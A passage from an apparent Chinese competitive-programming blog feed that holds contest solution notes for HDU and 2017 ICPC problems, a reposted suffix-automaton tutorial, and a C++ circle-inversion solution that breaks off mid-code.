Toposort</a></h3><p>题意：有向无环图有$n$个点$m$条边，问恰好删除$k$条边可以做到的字典序最小的拓扑序。<br>题解：考虑字典序最小，首先$1$号点放在第一绝对比放在第二好，那么：如果$1$号点当前的入度$d_1$小于等于$k$，直接将这$d_1$条边全部删除即可；如果大于，再测试$2$号点、$3$号点……。用优先队列保证每次取出的是最小编号的点，每条边访问一次，每个点最多入队$n$次，复杂度感觉上是$O((n+m)log{n})$。</p><p>注意点：<strong>对字典序和贪心的理解不够深刻</strong>。</p><h3 id="O-Deletion"><a href="#O-Deletion" class="headerlink" title="O - Deletion"></a><a href="https://vjudge.net/problem/HDU-5639" target="_blank" rel="noopener">O - Deletion</a></h3><p>题意：无向图$G$有$n$个点$m$条边，每次可以删除一个边集，要求这个边集组成的导出子图的每个连通分量最多只有一个环。问最少几次可以把图$G$完全删除。<br>题解：对于一个连通分量，若至多一个环，那它就是一个广义的环加外向树（可以没有环或者没有树）。环加树又可以理解为每个点最多一个出度，再反推回去，若有答案为$k$，那么等价于给图$G$中的每条边定向，使得所有点的出度均不超过$k$。考虑到一条边$(u,v)$，要么在$u$是出度要么在$v$是出度，新建一个点$x_{uv}$表示原图中的这条边，那么它要么与$u$匹配要么与$v$匹配。在这个新图中，左边的点(原图的点)最多匹配$k$次，右边的点(原图的边)最多匹配$1$次，且当右边的点完全匹配时$k$是一个可行的答案，可以二分答案每次判断最大流是不是等于$m$。xg最后提到其实二分可以不要，因为右边的点到汇的容量始终是$1$，每次改改增广路啥的。<del>【然而这种操作本菜鸡就没必要学了吧。。。</del></p><p>注意点：环、树、环加树的<strong>点数边数</strong>以及<strong>度数</strong>都有特殊的结论。</p><h3 id="P-Card-Game"><a href="#P-Card-Game" class="headerlink" title="P - Card Game"></a><a href="https://cn.vjudge.net/problem/HDU-5494" target="_blank" rel="noopener">P - Card Game</a></h3><p>题意：Soda 和 Beta 各有$n$张牌，两人随机抽$m$张牌，用它们的和比大小，问 Soda 能不能稳赢。<br>题解：取 Soda 最小的$m$张跟 Beta 最大的$m$张，它们的和比一下大小。</p><h3 id="Q-LCS"><a href="#Q-LCS" class="headerlink" title="Q - LCS"></a><a href="https://cn.vjudge.net/problem/HDU-5495" target="_blank" rel="noopener">Q - LCS</a></h3><p>题意：有两个排列${a_1, a_2, …, a_n}$，${b_1, b_2, …, b_n}$，要找到另一个排列${p_1, p_2, …, p_n}$，使得${a_{p_1},a_{p_2},…,a_{p_n}}$和${b_{p_1},b_{p_2},…,b_{p_n}}$的$LCS$最长，输出$LCS$长度的最大值。<br>题解：$b$是$a$的置换，长度为$l$的环能产生$l-1$的$LCS$。</p><p>注意点：特判环长度为1。</p><h3 id="R-Beauty-of-Sequence"><a href="#R-Beauty-of-Sequence" class="headerlink" title="R - Beauty of Sequence"></a><a href="https://vjudge.net/problem/HDU-5496" target="_blank" rel="noopener">R - Beauty of Sequence</a></h3><p>题意：定义魅力值为一个序列去除序列中连续重复元素(每一段只保留一个)后的序列的和。给出$n$个数的序列$a$，求$a$的所有子序列的魅力值之和。<br>题解：考虑单点贡献，并且出现连续相同值时只有最左边的要贡献。那么对于$a_i$，只要之前的子序列不以$a_i$结尾就可以贡献，累加答案以后更新一下以$a_i$结尾的子序列的数量即可。</p><p>注意点：不用考虑本质不同。</p><h3 id="U-Souvenir"><a href="#U-Souvenir" class="headerlink" title="U - Souvenir"></a><a href="https://vjudge.net/problem/HDU-5310" target="_blank" rel="noopener">U - Souvenir</a></h3><p>题意：$p$块钱可以买1个纪念品，$q$块钱可以买纪念品套装，内含$m$个纪念品，问要给$n$个人各发一个纪念品至少要多少钱。<br>题解：只有三种情况，只用$p$，只用$q$，用$q$直到剩下不到$m$的用$p$。</p><p>注意点：显然是可以多买的。</p><h3 id="W-Sequence"><a href="#W-Sequence" class="headerlink" title="W - Sequence"></a><a href="https://vjudge.net/problem/HDU-5312" target="_blank" rel="noopener">W - Sequence</a></h3><p>题意：一个数列的第$n(n \ge 1)$项为$3n(n-1)+1$，给出一个数$m$，问至少几个数的和能恰好等于$m$。如，$22 = 19 + 1 + 1 + 1 = 7 + 7 + 7 + 1$。若不能，输出$-1$。<br>题解：联想到三角形数$a_{n}=\frac{1}{2}n(n-1)$，至多3个三角形数可以表示任意自然数。而$3n(n-1)+1=6a_{n}+1$，那么$m\equiv ans \mod 6$。特判一下$ans$等于$1$或$2$，否则就是$3\dots 8$中与$m$同余的数。</p><p>注意点：<strong>特判也需要考虑复杂度</strong>！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;A-GCD-is-Funny&quot;&gt;&lt;a href=&quot;#A-GCD-is-Funny&quot; class=&quot;headerlink&quot; title=&quot;A - GCD is Funny&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://vjudge.net/problem/HDU-59
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>2017ICPC乌鲁木齐网络赛 全题解</title>
    <link href="https://www.smlight.xyz/2017/09/25/2017-urumqi-online/"/>
    <id>https://www.smlight.xyz/2017/09/25/2017-urumqi-online/</id>
    <published>2017-09-25T03:26:37.000Z</published>
    <updated>2018-02-09T13:19:33.699Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2017/09/09/icpc_urumqi" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="A-Banana"><a href="#A-Banana" class="headerlink" title="A. Banana"></a>A. Banana</h3><p>直接暴力。</p><h3 id="B-Out-out-control-cars"><a href="#B-Out-out-control-cars" class="headerlink" title="B. Out-out-control cars"></a>B. Out-out-control cars</h3><p>可以看作相对运动，然后三条射线跟三条线段判相交。<br>要注意的是大三角形的射线不碰到小三角形也可以yes，这个我们可以通过两个都判一遍来解决。<br>还有一种情况（数据里好像没有）是两者相对静止并且一个套一个，按照题意也是yes。</p><h3 id="C-Coconut"><a href="#C-Coconut" class="headerlink" title="C. Coconut"></a>C. Coconut</h3><p>直接模拟。</p><h3 id="D-Hack-Portals"><a href="#D-Hack-Portals" class="headerlink" title="D. Hack Portals"></a>D. Hack Portals</h3><p>poj原题。<del>没做过，所以比赛的时候也没做</del><br>按照坐标排序后，有一个贪心的结论：i到j这一段区间中，最优情况下最后一个做的不是i就是j。<br>考虑区间dp，我们用dp[i][j][0]表示i到j这一段最后做i的最小花费，dp[i][j][1]表示i到j这一段最后做j的最小花费。<br>转移还是挺容易的，转移了以后还要再考虑一下开放的时间。</p><h3 id="E-Half-consecutive-Numbers"><a href="#E-Half-consecutive-Numbers" class="headerlink" title="E. Half-consecutive Numbers"></a>E. Half-consecutive Numbers</h3><p>打表。<del>反正我们队只会打表了</del><br><img src="http://img.blog.csdn.net/20170928164144650" alt="q巨题解"></p><h3 id="F-Islands"><a href="#F-Islands" class="headerlink" title="F. Islands"></a>F. Islands</h3><p>hdu原题。<br>缩点以后看出度为0的点数和入度为0的点数，答案为较大值。注意特判只有1个scc。</p><h3 id="G-Query-on-a-string"><a href="#G-Query-on-a-string" class="headerlink" title="G. Query on a string"></a>G. Query on a string</h3><p>因为模式串的长度很短，小于等于10，所以修改一个字符最多只会影响主串中10个位置的匹配情况。那么操作可以转化为10次单点修改和区间求和，用一个树状数组维护就可以了。有影响的那个部分可以用kmp匹配一下。</p><h3 id="H-Skiing"><a href="#H-Skiing" class="headerlink" title="H. Skiing"></a>H. Skiing</h3><p>队友一下子就读懂了，加个源跑最长路就行。</p><h3 id="I-Colored-Graph"><a href="#I-Colored-Graph" class="headerlink" title="I. Colored Graph"></a>I. Colored Graph</h3><p>比赛的时候直接抄的论文。<del>还抄错了好多次</del><br>回忆同色三角形的计数过程，其实是算了异色三角形的个数$S$，$S=\frac{1}{2}\sum_{i=1}^{V}{a_{i}(V-1-a_{i})}$ 。<br>现要使得同色三角形个数尽量小，那么就要使每个点的${a_{i}(V-1-a_{i})}$尽量大。<br>由于和一定，两项自然是越接近结果越大。考虑把点集分为两个，每个集合内部的边都是白色，两个集合之间的都是黑色。<br>若$V$是偶数，那么每个点的值都是一模一样的，不用调整。<br>下面重点讨论$V$是奇数的情况，记$n=\lfloor \frac{V}{2} \rfloor$，则两个点集$V1$，$V2$的大小分别为$n$，$n+1$。<br>在$V1$中，每个点有$n+1$条黑边和$n-1$条白边，这一定是可以更优的。<br>首先把黑边分散地改成白边，即把在$i$和$n+i$之间的黑边改成白边，此时$V1$的点会很平衡，不过$V2$中有$n$个点变成了$n-1$条黑边和$n+1$条白边。<br>所以还能更优，当然这时不能再改$n$条边了，要不然就会没完了。将$V2$修改过的$n$个点分成$\frac{n}{2}$组点对，各点对中的白边改成黑边，那么这$n$个点有$n$条黑边和$n$条白边，非常恰好。如果$n$也是奇数，那么就不能这么恰好了，但是大体是一样的，见代码。</p><h3 id="J-Our-Journey-of-Dalian-Ends"><a href="#J-Our-Journey-of-Dalian-Ends" class="headerlink" title="J. Our Journey of Dalian Ends"></a>J. Our Journey of Dalian Ends</h3><p>hdu原题。<br>中转站为源做一遍最小费用流。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Tips&quot;&gt;&lt;a href=&quot;#Tips&quot; class=&quot;headerlink&quot; title=&quot;Tips&quot;&gt;&lt;/a&gt;Tips&lt;/h3&gt;&lt;p&gt;仅含题解，代码详见&lt;a href=&quot;https://github.com/Smlight/ACMer/tree/master
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>后缀自动机·基本概念</title>
    <link href="https://www.smlight.xyz/2017/08/27/SAM/"/>
    <id>https://www.smlight.xyz/2017/08/27/SAM/</id>
    <published>2017-08-27T01:30:33.000Z</published>
    <updated>2018-02-22T10:41:24.046Z</updated>
    
    <content type="html"><![CDATA[<p><span style="color: red">以下全文转载自<a href="http://hihocoder.com/problemset/problem/1441" target="_blank" rel="noopener">hihocoder</a></span>，今天看了一遍突然就懂了，难道我以前看的都是假文章？<br>小Hi：今天我们来学习一个强大的字符串处理工具：后缀自动机（Suffix Automaton，简称SAM）。<strong>对于一个字符串S，它对应的后缀自动机是一个最小的确定有限状态自动机（DFA），接受且只接受S的后缀。</strong></p><p>小Hi：比如对于字符串S=”aabbabd”，它的后缀自动机是：<br><img src="http://media.hihocoder.com/problem_images/20161203/14807564643248.png" alt=""><br>其中红色状态是终结状态。你可以发现对于S的后缀，我们都可以从S出发沿着字符标示的路径（蓝色实线）转移，最终到达终结状态。例如”bd”对应的路径是S59，”abd”对应的路径是S189，”abbabd”对应的路径是S184679。而对于不是S后缀的字符串，你会发现从S出发，最后会到达非终结状态或者“无路可走”。<strong>特别的，对于S的子串，最终会到达一个合法状态。</strong>例如”abba”路径是S1846，”bbab”路径是S5467。<strong>而对于其他不是S子串的字符串，最终会“无路可走”。</strong>例如”aba”对应S18X，”aaba”对应S123X。（X表示没有转移匹配该字符）</p><p>小Ho：好像很厉害的样子！对于任意字符串都能构造出一个SAM吗？另外图中那些绿色虚线是什么？</p><p>小Hi：是的，任意字符串都能构造出一个SAM。我们知道SAM本质上是一个DFA，DFA可以用一个五元组<strong>&lt;字符集，状态集，转移函数、起始状态、终结状态集&gt;</strong>来表示。下面我们将依次介绍对于一个给定的字符串S如何确定它对应的<strong>状态集</strong>和<strong>转移函数</strong>。至于那些绿色虚线虽然不是DFA的一部分，却是SAM的重要部分，有了这些链接SAM是如虎添翼，我们后面再细讲。</p><h2 id="SAM的States"><a href="#SAM的States" class="headerlink" title="SAM的States"></a>SAM的States</h2><p>小Hi：这一节我们将介绍给定一个字符串S，如何确定S对应的SAM有哪些状态。首先我们先介绍一个概念<strong>子串的结束位置集合</strong>endpos。对于S的一个子串s，endpos(s) = s在S中所有出现的结束位置集合。还是以S=”aabbabd”为例，endpos(“ab”) = {3, 6}，因为”ab”一共出现了2次，结束位置分别是3和6。同理endpos(“a”) = {1, 2, 5}, endpos(“abba”) = {5}。</p><p>小Hi：我们把S的所有子串的endpos都求出来。如果两个子串的endpos相等，就把这两个子串归为一类。最终这些endpos的等价类就构成的SAM的状态集合。例如对于S=”aabbabd”：</p><table><thead><tr><th>状态</th><th>子串</th><th>endpos</th></tr></thead><tbody><tr><td>S</td><td>空串</td><td>{0,1,2,3,4,5,6}</td></tr><tr><td>1</td><td>a</td><td>{1,2,5}</td></tr><tr><td>2</td><td>aa</td><td>{2}</td></tr><tr><td>3</td><td>aab</td><td>{3}</td></tr><tr><td>4</td><td>aabb,abb,bb</td><td>{4}</td></tr><tr><td>5</td><td>b</td><td>{3,4,6}</td></tr><tr><td>6</td><td>aabba,abba,bba,ba</td><td>{5}</td></tr><tr><td>7</td><td>aabbab,abbab,bbab,bab</td><td>{6}</td></tr><tr><td>8</td><td>ab</td><td>{3,6}</td></tr><tr><td>9</td><td>aabbabd,abbabd,bbabd,babd,abd,bd,d</td><td>{7}</td></tr></tbody></table><p>小Ho：这些状态恰好就是上面SAM图中的状态。</p><p>小Hi：没错。此外，这些状态还有一些美妙的性质，且等我一一道来。首先对于S的两个子串s1和s2，不妨设length(s1) &lt;= length(s2)，那么<strong>s1是s2的后缀当且仅当endpos(s1) ⊇ endpos(s2)，s1不是s2的后缀当且仅当endpos(s1) ∩ endpos(s2) = ∅。</strong></p><p>小Ho：我验证一下啊… 比如”ab”是”aabbab”的后缀，而endpos(“ab”)={3,6}，endpos(“aabbab”)={6}，是成立的。”b”是”ab”的后缀，endpos(“b”)={3,4,6}, endpos(“ab”)={3,6}也是成立的。”ab”不是”abb”的后缀，endpos(“ab”)={3,6}，endpos(“abb”)={4}，两者没有交集也是成立的。怎么证明呢？</p><p>小Hi：证明还是比较直观的。首先证明<strong>s1是s2的后缀=&gt;endpos(s1) ⊇ endpos(s2)</strong>：既然s1是s2后缀，所以每次s2出现时s1以必然伴随出现，所以有endpos(s1) ⊇ endpos(s2)。再证明<strong>endpos(s1) ⊇ endpos(s2)=&gt;s1是s2的后缀</strong>：我们知道对于S的子串s2，endpos(s2)不会是空集，所以endpos(s1) ⊇ endpos(s2)=&gt;存在结束位置x使得s1结束于x，并且s2也结束于x，又length(s1) &lt;= length(s2)，所以s1是s2的后缀。综上我们可知<strong>s1是s2的后缀当且仅当endpos(s1) ⊇ endpos(s2)。s1不是s2的后缀当且仅当endpos(s1) ∩ endpos(s2) = ∅</strong>是一个简单的推论，不再赘述。</p><p>小Ho：我好像对SAM的状态有一些认识了！我刚才看上面的表格就觉得SAM的一个状态里包含的子串好像有规律。考虑到SAM中的一个状态包含的子串都具有相同的endpos，那它们应该都互为后缀？</p><p>小Hi：你观察力还挺敏锐的。下面我们就来讲讲一个状态包含的子串究竟有什么关系。上文提到我们把S的所有子串按endpos分类，每一类就代表一个状态，所以我们可以认为一个状态包含了若干个子串。我们用substrings(st)表示状态st中包含的所有子串的集合，longest(st)表示st包含的最长的子串，shortest(st)表示st包含的最短的子串。例如对于状态7，substring(7)={aabbab,abbab,bbab,bab}，longest(7)=aabbab，shortest(7)=bab。</p><p>小Hi：<strong>对于一个状态st，以及任意s∈substrings(st)，都有s是longest(st)的后缀。</strong>证明比较容易，因为endpos(s)=endpos(longest(st))，所以endpos(s) ⊇ endpos(longest(st))，根据我们刚才证明的结论有s是longest(st)的后缀。</p><p>小Hi：此外，<strong>对于一个状态st，以及任意的longest(st)的后缀s，如果s的长度满足：length(shortest(st)) &lt;= length(s) &lt;= length(longsest(st))，那么s∈substrings(st)。</strong>证明也是比较容易，因为：length(shortest(st)) &lt;= length(s) &lt;= length(longsest(st))，所以endpos(shortest(st)) ⊇ endpos(s) ⊇ endpos(longest(st))， 又endpos(shortest(st)) = endpos(longest(st))，所以endpos(shortest(st)) = endpos(s) = endpos(longest(st))，所以s∈substrings(st)。</p><p>小Ho：这么说来，substrings(st)包含的是longest(st)的一系列<strong>连续</strong>后缀？</p><p>小Hi：没错。比如你看状态7中包含的就是aabbab的长度分别是6，5，4，3的后缀；状态6包含的是aabba的长度分别是5，4，3，2的后缀。</p><h2 id="SAM的Suffix-Links"><a href="#SAM的Suffix-Links" class="headerlink" title="SAM的Suffix Links"></a>SAM的Suffix Links</h2><p>小Hi：前面我们讲到substrings(st)包含的是longest(st)的一系列<strong>连续</strong>后缀。这连续的后缀在某个地方会“断掉”。比如状态7，包含的子串依次是aabbab,abbab,bbab,bab。按照连续的规律下一个子串应该是”ab”，但是”ab”没在状态7里，你能想到这是为什么么？</p><p>小Ho：aabbab,abbab,bbab,bab的endpos都是{6}，下一个”ab”当然也在结束位置6出现过，但是”ab”还在结束位置3出现过，所以”ab”比aabbab,abbab,bbab,bab出现次数更多，于是就被分配到一个新的状态中了。</p><p>小Hi：没错，当longest(st)的某个后缀s在新的位置出现时，就会“断掉”，s会属于新的状态。比如上例中”ab”就属于状态8，endpos(“ab”}={3,6}。当我们进一步考虑”ab”的下一个后缀”b”时，也会遇到相同的情况：”b”还在新的位置4出现过，所以endpos(“b”)={3,4,6}，b属于状态5。在接下去处理”b”的后缀我们会遇到空串，endpos(“”)={0,1,2,3,4,5,6}，状态是起始状态S。</p><p>小Hi：于是我们可以发现一条状态序列：7-&gt;8-&gt;5-&gt;S。这个序列的意义是longest(7)即aabbab的后缀依次在状态7、8、5、S中。我们用Suffix Link这一串状态链接起来，这条link就是上图中的绿色虚线。</p><p>小Ho：原来如此。</p><p>小Hi：Suffix Links后面会有妙用，我们暂且按下不表。</p><h2 id="SAM的Transition-Function"><a href="#SAM的Transition-Function" class="headerlink" title="SAM的Transition Function"></a>SAM的Transition Function</h2><p>小Hi：最后我们来介绍SAM的转移函数。对于一个状态st，我们首先找到从它开始下一个遇到的字符可能是哪些。我们将st遇到的下一个字符集合记作next(st)，有next(st) = {S[i+1] | i ∈ endpos(st)}。例如next(S)={S[1], S[2], S[3], S[4], S[5], S[6], S[7]}={a, b, d}，next(8)={S[4], S[7]}={b, d}。</p><p>小Hi：对于一个状态st来说和一个next(st)中的字符c，你会发现substrings(st)中的所有子串后面接上一个字符c之后，新的子串仍然都属于同一个状态。比如对于状态4，next(4)={a}，aabb,abb,bb后面接上字符a得到aabba，abba，bba，这些子串都属于状态6。</p><p>小Hi：所以我们对于一个状态st和一个字符c∈next(st)，可以定义转移函数trans(st, c) = x | longest(st) + c ∈ substrings(x) 。换句话说，我们在longest(st)（随便哪个子串都会得到相同的结果）后面接上一个字符c得到一个新的子串s，找到包含s的状态x，那么trans(st, c)就等于x。</p><p>小Ho：吼~ 终于把SAM中各个部分搞明白了。</p><p>小Hi：SAM的构造有时空复杂度均为O(length(S))的算法，我们将在后面介绍。这一期你可以先用暴力算法依照定义构造SAM，先对SAM有个直观认识再说。</p><p>小Ho：没问题，暴力算法我最拿手了。我先写程序去了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;span style=&quot;color: red&quot;&gt;以下全文转载自&lt;a href=&quot;http://hihocoder.com/problemset/problem/1441&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hihocoder&lt;/a&gt;&lt;/span
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>2017年多校联训9 部分题解</title>
    <link href="https://www.smlight.xyz/2017/08/23/2017-multi9/"/>
    <id>https://www.smlight.xyz/2017/08/23/2017-multi9/</id>
    <published>2017-08-23T11:24:15.000Z</published>
    <updated>2018-02-21T13:08:54.045Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>仅含题解，代码详见<a href="https://github.com/Smlight/ACMer/tree/master/2017/08/22/2017%E5%A4%9A%E6%A0%A19" target="_blank" rel="noopener">github</a>。<del>喜欢的话点个star</del></p><h3 id="1002-Ch’s-gift"><a href="#1002-Ch’s-gift" class="headerlink" title="1002.    Ch’s gift"></a>1002.    Ch’s gift</h3><p>首先考虑序列上的问题。</p><p>$a$ 是一个二维数组，如果第 $i$ 位置的值为 $j$，就在 $a_{i,j}$上加上 $j$ 。那么某个询问 $x,y,a,b$ 的答案就是子矩阵的和。如果一开始就把二维前缀和算出来的话就可以回答$O(1)$，答案等于 $(Sum(y,b)-Sum(y,a-1))-(Sum(x,b)-Sum(x,a-1))$ 。</p><p>考虑到 $a,b$ 的范围非常大，可以把所有询问离散化。当然就算离散化，预处理二维前缀和还是不行的，我们发现前缀和相当于把 $[a,b]$ 拆成 $[1,b]-[1,a-1]$，联想到扫描线，把 $a,b$ 这一维的每个区间拆成两条线，用扫描线从小到大扫这一维，$x,y$ 这一维直接预处理一下前缀和每次 $O(1)$ 查就行了。</p><p>再搬到树上，直接套一个树链剖分就行了，树状数组就能维护。</p><p>ps: 可持久化线段树可以在线回答，等写出来了更新</p><h3 id="1005-FFF-at-Valentine"><a href="#1005-FFF-at-Valentine" class="headerlink" title="1005.    FFF at Valentine"></a>1005.    FFF at Valentine</h3><p>强连通缩点加拓扑序判分叉，不多说了。</p><h3 id="1006-Senior-Pan"><a href="#1006-Senior-Pan" class="headerlink" title="1006.    Senior Pan"></a>1006.    Senior Pan</h3><p>这题主要是题意有点不清楚。。。大小为 $k$ 的端点集合，题目的意思是起点终点不能是同一个【不过也是有道理的。。。</p><p>拆点，加超级源超级汇，再跑一下dij 。这个限制可以每个点维护一下被谁松弛过，比如现在想用 $i$ 松弛 $j’$，如果 $j$ 松弛过 $i’$，直接不让松弛就行了。一个点被松弛的次数小于总点数，复杂度也就是多个 $logn$，具体表现可能比20次dij好一点吧。</p><h3 id="1008-Numbers"><a href="#1008-Numbers" class="headerlink" title="1008.    Numbers"></a>1008.    Numbers</h3><p>从小到大取，$O(n^2logm)$，$n$ 是 $\sqrt{m}$ 级别。</p><h3 id="1010-Two-strings"><a href="#1010-Two-strings" class="headerlink" title="1010.    Two strings"></a>1010.    Two strings</h3><p>主要还是题意比较坑。。。匹配<code>.*</code>是要把<code>.</code>先变成某个字符再处理<code>*</code>。。。</p><p>队友(<em>wenwenla</em>)写了一种dp，先预处理pattern，dp[i]保存pattern前i个字符为止可以匹配到text的最左和最右，可以证明这个界里面的每一个都是可取的。</p><p>具体实现加一维表示最左最右，然后发现第一维可以去掉。</p><p><a href="https://github.com/Smlight/ACMer/blob/master/2017/08/22/2017%E5%A4%9A%E6%A0%A19/1010.cpp" target="_blank" rel="noopener">1010.cpp</a></p><p>时间0ms，就是容易写错。。。比赛的时候前面WA的都交上去了，最后一次AC的代码却没交上去[cry]。。。而且我们亲眼看到点了submit以后页面跳转了。。。结果连提交记录都没有？？</p><p>后来有人说了才发现这样直接正则就能过。<del>这题出得真好？？</del></p><p><a href="https://github.com/Smlight/ACMer/blob/master/2017/08/22/2017%E5%A4%9A%E6%A0%A19/1010_regex.cpp" target="_blank" rel="noopener">1010_regex.cpp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Tips&quot;&gt;&lt;a href=&quot;#Tips&quot; class=&quot;headerlink&quot; title=&quot;Tips&quot;&gt;&lt;/a&gt;Tips&lt;/h3&gt;&lt;p&gt;仅含题解，代码详见&lt;a href=&quot;https://github.com/Smlight/ACMer/tree/master
      
    
    </summary>
    
    
      <category term="ACM" scheme="https://www.smlight.xyz/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>hdu 6158 The Designer</title>
    <link href="https://www.smlight.xyz/2017/08/20/hdu6158/"/>
    <id>https://www.smlight.xyz/2017/08/20/hdu6158/</id>
    <published>2017-08-20T10:31:55.000Z</published>
    <updated>2018-02-12T03:08:09.699Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>比赛之后有大佬说这题可以用圆的反演来做，学习了一下。</p><p>以两个大圆的切点为反演中心，任取一个反演半径，两个大圆会变成两条平行线。再考虑小圆的反演，由于相切的性质不变，小圆的反演圆就是一列夹在平行线中间的小圆。</p><p>示意图：</p><p><img src="http://img.blog.csdn.net/20170820182706028" alt="圆的反演"></p><p>当然这样还是 $O(n)$ 的，但是看题目里的图就知道小圆会越来越小，小到一定程度以后直接不考虑就行了。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#include &lt;bits/stdc++.h&gt;</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="title">std</span>;</div><div class="line"></div><div class="line">typedef <span class="keyword">long</span> <span class="keyword">double</span> ld;</div><div class="line"><span class="keyword">const</span> ld IR2=<span class="number">100</span>;</div><div class="line"><span class="keyword">const</span> ld PI=<span class="number">3.141592653589793238462643383279502884197169399375105820974944592307816</span>L;</div><div class="line"><span class="keyword">struct</span> Point &#123;</div><div class="line">    ld x,y;</div><div class="line">    Point(ld _x=<span class="number">0</span>,ld _y=<span class="number">0</span>):x(_x),y(_y) &#123;&#125;</div><div class="line">    Point <span class="keyword">operator</span> +(<span class="keyword">const</span> Point &amp;R) &#123;</div><div class="line">        <span class="keyword">return</span> Point(R.x+x,R.y+y);</div><div class="line">    &#125;</div><div class="line">    Point <span class="keyword">operator</span> -(<span class="keyword">const</span> Point &amp;R) &#123;</div><div class="line">        <span class="keyword">return</span> Point(R.x-x,R.y-y);</div><div class="line">    &#125;</div><div class="line">    ld <span class="keyword">operator</span> *(<span class="keyword">const</span> Point &amp;R) &#123;</div><div class="line">        <span class="keyword">return</span> R.x*x+R.y*y;</div><div class="line">    &#125;</div><div class="line">    Point <span class="keyword">operator</span> *(<span class="keyword">const</span> ld &amp;R) &#123;</div><div class="line">        <span class="keyword">return</span> Point(x*R,y*R);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">double</span> o1=x,o2=y;</div><div class="line">        cout&lt;&lt;o1&lt;&lt;<span class="string">" "</span>&lt;&lt;o2&lt;&lt;<span class="string">"\n"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> sqr(x) ((x)*(x))</span></div><div class="line"><span class="function">ld <span class="title">inv_circle</span>(<span class="params">Point O,Point C,ld r</span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> IR2*r/(sqr(O-C)-sqr(r));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    scanf(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="function">Point <span class="title">O</span>(<span class="params"><span class="number">0</span>,<span class="number">0</span></span>)</span>;</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">double</span> t1,t2;</div><div class="line">        scanf(<span class="string">"%lf%lf"</span>,&amp;t1,&amp;t2);</div><div class="line">        <span class="keyword">if</span> (t1&gt;t2) swap(t1,t2);</div><div class="line">        ld r=t1,R=t2;</div><div class="line">        <span class="keyword">int</span> n;</div><div class="line">        scanf(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="function">Point <span class="title">P</span>(<span class="params"><span class="number">0.5</span>*IR2/R,<span class="number">0</span></span>)</span>;</div><div class="line">        <span class="function">Point <span class="title">Q</span>(<span class="params"><span class="number">0.5</span>*IR2/r,<span class="number">0</span></span>)</span>;</div><div class="line">        ld L=Q.x-P.x;</div><div class="line">        <span class="function">Point <span class="title">o</span>(<span class="params">(P+Q</span>)*0.5)</span>;</div><div class="line">        ld ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">if</span> (n%<span class="number">2</span>==<span class="number">0</span>) &#123;</div><div class="line">            <span class="function">Point <span class="title">C</span>(<span class="params">o.x,o.y+(n/<span class="number">2</span></span>)*L)</span>;</div><div class="line">            ld rr=inv_circle(O,C,L*<span class="number">0.5</span>);</div><div class="line">            ans+=PI*rr*rr;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i+i<span class="number">-1</span>&lt;=n;i++) &#123;</div><div class="line">            <span class="function">Point <span class="title">C</span>(<span class="params">o.x,o.y+(i<span class="number">-1</span></span>)*L)</span>;</div><div class="line">            ld rr=inv_circle(O,C,L*<span 